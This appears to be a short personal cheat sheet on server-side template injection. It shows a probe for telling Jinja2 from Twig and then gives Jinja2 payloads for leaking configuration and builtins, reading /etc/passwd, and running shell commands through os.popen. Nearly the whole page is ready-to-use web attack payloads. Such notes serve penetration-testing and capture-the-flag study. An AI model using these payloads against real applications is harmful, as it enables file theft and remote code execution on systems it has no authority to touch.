____

![[Pasted image 20241004110914.png]]

`{{7*'7'}}`. The result will enable us to deduce the template engine used by the web application. In Jinja, the result will be `7777777`, while in Twig, the result will be `49`.

# Jinja2

## Information Disclosure

```jinja2
{{ config.items() }}
```

```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```

## LFI

```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

## RCE

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

